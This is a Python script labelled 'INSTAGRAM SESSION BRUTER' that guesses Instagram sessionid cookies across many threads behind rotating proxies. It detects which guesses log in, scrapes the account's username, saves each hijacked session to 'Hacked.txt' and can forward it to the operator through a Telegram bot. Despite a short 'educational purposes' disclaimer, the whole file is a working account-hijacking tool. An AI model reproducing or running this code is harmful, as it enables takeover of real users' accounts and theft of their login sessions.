'''

This program is for educational purposes and to spread awarness about how cookies work 
on the social media platform Instagram.

Please do not use it in a way to harm other people or to commit a cyber crime.

Intagram: @a7.acc
Telegram: @A7_acc

'''
import os
import threading
from random import choice

try:
    import requests
except ImportError:  # pragma: no cover
    requests = None

try:
    from colored import attr, fg
except ImportError:  # pragma: no cover
    def fg(_color):
        return ''

    def attr(_attribute):
        return ''

try:
    from user_agent import generate_user_agent
except ImportError:  # pragma: no cover
    def generate_user_agent():
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'


# Safe defaults so the module can be imported in tests without running the CLI.
telegram = 'n'
proxies = []
user_ids = []
isUserid = False
index = 0
numbers = list(range(20))
bad = 0
good = 0


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


# Markers
g = lambda x: fg('green') + x + attr('reset')
rod = lambda x: fg('red') + x + attr('reset')
b = lambda x: fg('blue') + x + attr('reset')
y = lambda x: fg('yellow') + x + attr('reset')
c = lambda x: fg('cyan') + x + attr('reset')
m = lambda x: fg('magenta') + x + attr('reset')
exl = '[' + rod('!') + ']'
ques = '[' + m('?') + ']'
ha = '[' + g('#') + ']'
mult = '[' + c('*') + ']'

logo = rod(r'''
 ,/         \.
 ((           ))         
  \`.       ,'/          
   )')     (`(             
 ,'`/       \,`.     
(`-(         )-')
 \-'\,-'"`-./`-/ 
  \-')     (`-/  
  /`'       `'\   
 (  _       _  ) 
 | ( \     / ) |
 |  `\.   /,'  |
 |    `\ /'    |     {m('INSTAGRAM SESSION BRUTER')}
 (             )
  \           /
   \         /
    `.     ,'           
      `-.-''') + f'\n           Program By IG: {b("@a7.acc")}'


# A function that creates random strings
def ra(length, ty):
    if ty == 'a0':
        randoms = ''.join('qwertyuiopasdfghjklzxcvbnm1234567890')
    elif ty == 'A0':
        randoms = ''.join('QWERTYUIOPASDFGHJKLZXCVBNM1234567890')
    elif ty == 'Az':
        randoms = ''.join('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm')
    elif ty == 'All':
        randoms = ''.join('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890')
    elif ty == 'a':
        randoms = ''.join('qwertyuiopasdfghjklzxcvbnm')
    elif ty == 'n':
        randoms = ''.join('1234567890')
    else:
        raise ValueError(f'Unsupported random type: {ty}')

    return ''.join(choice(randoms) for _ in range(int(length)))


# Sends the hit on telegram. Your telegram info should be in this format token/id in a text file named tele.txt
def send_info(info):
    global telegram
    try:
        if telegram == 'y':
            with open('tele.txt', 'r', encoding='utf-8') as fa:
                tokid = fa.read().split('/')
                if len(tokid) >= 2:
                    requests.post(
                        f'https://api.telegram.org/bot{tokid[0]}/sendMessage?chat_id={tokid[1]}&text={info}',
                        timeout=10,
                    )
    except Exception:
        pass

    with open('Hacked.txt', 'a', encoding='utf-8') as hackyro:
        hackyro.write(info + '\n')


# Checking function
def check():
    global index, bad, good
    while True:
        os.system(f'title ALL:{str(good + bad)}   GOOD:{str(good)}   BAD:{str(bad)}   THREADS:{str(threading.active_count() - 1)}')
        if isUserid:
            try:
                log = str(user_ids[index]) + '%3A' + ra(14, 'All') + '%3A' + str(choice(numbers))
                index += 1
            except IndexError:
                index = 0
                log = str(user_ids[index]) + '%3A' + ra(14, 'All') + '%3A' + str(choice(numbers))
                index += 1
        else:
            log = ra(choice([9, 10, 11]), 'n') + '%3A' + ra(14, 'All') + '%3A' + str(choice(numbers))

        usrid = log.split('%')[0]
        logged = False
        while True:
            try:
                the_cookie = f'sessionid={log};shbid={ra(5, "n")}; shbts={ra(10, "n")}.{ra(7, "n")}; datr={ra(12, "All")}_{ra(11, "All")}; ds_user_id={usrid}'
                req = requests.get(
                    'https://www.instagram.com/',
                    headers={'user-agent': generate_user_agent(), 'cookie': the_cookie},
                    proxies=choice(proxies) if proxies else None,
                    timeout=5,
                )
                if 'no-js not-logged-in client-root' in req.text:
                    bad += 1
                    os.system(f'title ALL:{str(good + bad)}   GOOD:{str(good)}   BAD:{str(bad)}   THREADS:{str(threading.active_count() - 1)}')
                    break
                if ' logged-in ' in req.text or usrid in req.text:
                    good += 1
                    logged = True
                    os.system(f'title ALL:{str(good + bad)}   GOOD:{str(good)}   BAD:{str(bad)}   THREADS:{str(threading.active_count() - 1)}')
                    print(ha + ' Valid session! : ' + str(log))
                    break
            except Exception:
                pass

        if logged:
            try:
                username = req.text.split('\\"username\\":\\"')[1].split('\\",\\"badge_co')[0]
            except Exception:
                try:
                    req = requests.get(
                        'https://www.instagram.com/',
                        headers={'user-agent': generate_user_agent(), 'cookie': f'sessionid={log};'},
                        timeout=5,
                    )
                    username = req.text.split('"username":"')[1].split('","badge_cou')[0]
                except Exception:
                    username = 'NOT FOUND!'
            info = 'Valid session! : ' + str(log) + '\nFull Cookie : ' + the_cookie + '\nUsername : ' + username + '\n------ Program By @A7_acc ------'
            send_info(info)
            print(ha + ' Username: ' + str(username) + '\n')


# Executing all the threads
def start_threads(amount):
    for _ in range(int(amount)):
        try:
            thread = threading.Thread(target=check)
            thread.start()
        except Exception:
            pass


# The main function of the program / the start point
def main():
    global isUserid, user_ids, telegram, proxies

    print(logo)
    option = input('.\n.\n┌───' + ques + f' Select An Option \n└──>> [{b("A")}] Use Existing USERID\'s \n└──>> [{b("B")}] Generate Random USERID\'s \n└──────────────>> ').lower()
    if option == 'a':
        isUserid = True
        file = input('.\n.\n┌───' + ques + f' Enter the file name of the USER ID\'s\n└─────────────────>> ')
        if not file.endswith('.txt'):
            file += '.txt'

        try:
            with open(file, 'r', encoding='utf-8') as ff:
                user_ids = ff.read().splitlines()
        except OSError as err:
            print(exl + ' Error while opening the user id file > ' + y(str(err)))
            return
    else:
        isUserid = False

    print(exl + ' You should use proxies otherwise the program won\'t work')
    proxies_name = input('.\n.\n┌───' + ques + f' Enter The Name Of The Proxy File \n└──────────────>> ').lower()
    if '.txt' not in proxies_name:
        proxies_name += '.txt'

    prxs = []
    try:
        with open(proxies_name, 'r', encoding='utf-8') as pr:
            prxs = pr.read().splitlines()
    except OSError as err:
        print(exl + ' Error while opening the proxy file > ' + y(str(err)))
        return

    if not prxs:
        print(exl + ' Proxy file is empty')
        return

    proxies = []
    typp = input('.\n.\n┌───' + ques + f" Enter the proxies type:\n└──>>[{c('1')}] HTTP/S\n└──>>[{c('2')}] SOCKS4\n└──>>[{c('3')}] SOCKS5\n└─────────>> ")
    for pr in prxs:
        if typp == '1':
            proxies.append({'http': f'https://{pr}', 'https': f'http://{pr}'})
        elif typp == '2':
            proxies.append({'http': f'socks4://{pr}', 'https': f'socks4://{pr}'})
        else:
            proxies.append({'http': f'socks5://{pr}', 'https': f'socks5://{pr}'})

    print('\n' + mult + f' Enter your telegram bot information in this format {c("token/id")} in {b("tele.txt")} file.')
    print(mult + f' You may NOT recieve all the hacked sessions on Telegram.. Anyhow, all the sessions will be in ' + c('Hacked.txt '))
    telegram = input('.\n.\n┌───' + ques + ' Do you want to get Hacked Sessions also on telegram? (Y/n) \n└──────────────>> ').lower()

    threads = input('.\n.\n┌───' + ques + f' Enter The Amount Of Threads You Want To Use\n└─────────────────>> ')
    clear()
    print(logo)
    start_threads(threads)


if __name__ == '__main__':
    main()
